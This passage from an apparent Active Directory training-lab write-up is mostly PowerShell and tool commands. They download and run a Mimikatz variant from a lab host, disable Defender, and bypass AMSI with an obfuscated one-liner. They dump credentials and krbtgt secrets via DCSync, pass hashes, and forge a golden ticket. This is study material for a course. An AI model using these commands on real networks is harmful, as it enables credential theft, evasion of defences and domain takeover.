</span></pre></table></code></div></div><p>Then we’ll use Invoke-Mimi.ps1. Start by hosting it on your machine and running this on the reverse shell</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://172.16.100.20/Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Then we need to disable AMSI on the dcorp-mgmt machine, we can do the AMSI bypass shown earlier or use the built in Set-MpPreference as well because we are admins on the dcorp-mgmt machine.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PsSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-mgmt.dollarcorp.moneycorp.local</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="p">{</span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableIOAVProtection</span><span class="w"> </span><span class="bp">$true</span><span class="p">}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">${function:Invoke-Mimi}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span></pre></table></code></div></div><p>Using Rubeus:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">aes256</span><span class="w"> </span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Will open a new process, which we can access the domain controller using</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><p>Now we need to escalate to domain admin using derivative local admin. Let’s find out the machines which we have local admin privileges by loading a powershell session with invisishell and enter the following commands</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Find-PSRemotingLocalAdminAccess</span><span class="w">
</span></pre></table></code></div></div><p>We have local admin on the dcorp-adminsrv, but any attempt to run loader.exe results in error ‘this program is blocked by group policy’, and any attempts to run invoke-mimi results in errors about language mode. This is because we are dropped into Constrained Language Mode when using PSRemoting. We can check if applocker is configured on dcorp-adminsrv by querying registry keys.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-adminsrv</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsft\Windows\SRPV2</span><span class="w">
</span></pre></table></code></div></div><p>and it looks like applocker is configured. Going through the policies will show that only Microsoft signed binaries and scripts are allowed, however there is a certain rule that is overly permissive.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">C:\Users\studentx</span><span class="err">&gt;</span><span class="nx">reg</span><span class="w"> </span><span class="nx">query</span><span class="w">
</span><span class="n">HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454fa263-2515c8796a5d</span><span class="w">
</span><span class="nx">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b934c-454f-a263-2515c8796a5d</span><span class="w">
</span><span class="n">AlteredSecurity</span><span class="w"> </span><span class="nx">Attacking</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">Defending</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">41</span><span class="w">
</span><span class="n">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b934c-454f-a263-2515c8796a5d</span><span class="w">
 </span><span class="nx">Value</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">FilePathRule</span><span class="w"> </span><span class="nx">Id</span><span class="o">=</span><span class="s2">"06dce67b-934c-454f-a263-
2515c8796a5d"</span><span class="w"> </span><span class="n">Name</span><span class="o">=</span><span class="s2">"(Default Rule) All scripts located in the Program Files
folder"</span><span class="w"> </span><span class="n">Description</span><span class="o">=</span><span class="s2">"Allows members of the Everyone group to run scripts that
are located in the Program Files folder."</span><span class="w"> </span><span class="n">UserOrGroupSid</span><span class="o">=</span><span class="s2">"S-1-1-0"</span><span class="w">
</span><span class="n">Action</span><span class="o">=</span><span class="s2">"Allow"</span><span class="err">&gt;&lt;</span><span class="n">Conditions</span><span class="err">&gt;&lt;</span><span class="nx">FilePathCondition</span><span class="w">
</span><span class="n">Path</span><span class="o">=</span><span class="s2">"%PROGRAMFILES%\*"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">/Conditions</span><span class="err">&gt;&lt;</span><span class="nx">/FilePathRule</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>A default rule is enabled that allows everyone to run scripts from the C:\Program Files\ Folder. We can also confirm this using powershell as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nx">dcorp-adminsrv</span><span class="w">

</span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">

</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">Effective</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">RuleCollections</span><span class="w">
</span></pre></table></code></div></div><p>We can drop scripts in the Program Files directory and execute them from there, but we’ll need to disable defender first using</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>Also, because we can not . source scripts because of the CLM, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script to the target server.</p><p>Create Invoke-MimiEx.ps1</p><ul><li>Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.<li>Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).<li>Add “Invoke-Mimi -Command ‘“sekurlsa::ekeys”’ “ (without quotes) to the end of the file.</ul><p>Then run this command to copy it to the target machine</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Copy-Item</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-MimiEx.ps1</span><span class="w"> </span><span class="nx">\\dcorpadminsrv.dollarcorp.moneycorp.local\c</span><span class="err">$</span><span class="nx">\</span><span class="s1">'Program Files'</span><span class="w">
</span></pre></table></code></div></div><p>Then run the script without . sourcing as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Invoke-MimiEx.ps1</span><span class="w">
</span></pre></table></code></div></div><p>And we can get credentials for srvadmin, appadmin, and websvc users. From local system (as admin) we can overpass the hash using safetykatz:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::pth /user:srvadmin
/domain:dollarcorp.moneycorp.local
/aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
/run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>The new process spawned has srvadmin privileges, we can check if srvadmin has admin privileges on other machines as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span><span class="n">Find-PSRemotingLocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>And we will see that we have local admin access on the dcorp-mgmt as srvadmin, which we know already has a session of svcadmin. We can use SafetyKatz to extract more credentials from the machine. Run the below commands from the process running as srvadmin. First copy the loader to dcorp-mgmt:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorpmgmt\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w">
</span></pre></table></code></div></div><p>extract the credentials:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="err">&gt;</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w">
</span><span class="n">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w"> </span><span class="nx">sekurlsa::ekeys</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></table></code></div></div><p>We can also use Invoke-Mimi with PSRemoting as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-mgmt</span><span class="w">
</span></pre></table></code></div></div><p>And then disable AMSI using the “set item” blob. then download and execute InvokeMimi as following</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://172.16.100.X/Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::ekeys"'</span><span class="w">
</span></pre></table></code></div></div><p>We can also use Invoke-Mimi to look for credentials from the credentials vault, sometimes interesting credentials like those used for scheduled tasks will be stored here. You can do this as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"token::elevate" "vault::cred /patch"'</span><span class="w">
</span></pre></table></code></div></div><p>Finally, we can use the svcadmin credentials on the student VM using OverPasstheHaash as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w">
</span><span class="n">/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><span class="w">
</span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> 
</span></pre></table></code></div></div><p>And the new process wil start with the privileges of SVCadmin.</p><h3 id="learning-objective-8"><span class="mr-2">Learning Objective 8</span><a href="#learning-objective-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this learning objective we will extract secrets from the DC of dollarcorp, using the secrets of KRBTGT account to make a golden ticket, and use the golden ticket to get domain admin privileges from a machine.</p><h4 id="using-safetykatzexe"><span class="mr-2">Using SafetyKatz.exe</span><a href="#using-safetykatzexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Run the below command from an admin cmd prompt to start a process with DA privileges:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w">
</span><span class="n">/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><span class="w">
</span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then run the below commands from the process running as DA to copy loader.exe onto the DC and use it to extract credentials</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorp-dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">

</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w">
</span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">20</span><span class="w">

</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w">
</span><span class="n">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">

</span><span class="n">lsadump::lsa</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></pre></table></code></div></div><p>or, to get the NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack as follows from the DA process:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync
/user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Finally, we can use BetterSafetyKatz.exe to create a golden ticket as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648
/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">

</span><span class="n">klist</span><span class="w"> </span><span class="p">(</span><span class="n">will</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">cached</span><span class="w"> </span><span class="nx">ticket</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">client:</span><span class="w"> </span><span class="nx">Administrator</span><span class="p">)</span><span class="w">

</span><span class="n">dir</span><span class="w"> </span><span class="nx">\\dcorp-dc\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h4 id="using-powershell-remoting-and-invoke-mimips1"><span class="mr-2">Using Powershell remoting and Invoke-Mimi.ps1</span><a href="#using-powershell-remoting-and-invoke-mimips1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Start a process with domain admin privileges and run the below command from an elevated shell:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::pth /user:svcadmin
/domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8
/run:cmd.exe"'</span><span class="w">
</span></pre></table></code></div></div><p>Then run the below commands in the process running as DA</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="w">

</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">

</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">S</span><span class="se">`e</span><span class="nx">T-It</span><span class="se">`e</span><span class="nx">m</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w">
</span><span class="p">(</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uZ'</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w">
</span><span class="n">Get-varI</span><span class="se">`A`B</span><span class="nx">LE</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nt">-VaL</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w">
</span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'
s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'msi'</span><span class="p">),</span><span class="s1">'d'</span><span class="p">,(</span><span class="s1">'I'</span><span class="o">+</span><span class="s1">'nitF'</span><span class="o">+</span><span class="s1">'aile'</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w">
</span><span class="p">(</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'tat'</span><span class="p">),</span><span class="s1">'i'</span><span class="p">,(</span><span class="s1">'Non'</span><span class="o">+</span><span class="s1">'Publ'</span><span class="o">+</span><span class="s1">'i'</span><span class="p">),</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w">
</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="kr">exit</span><span class="w">

</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

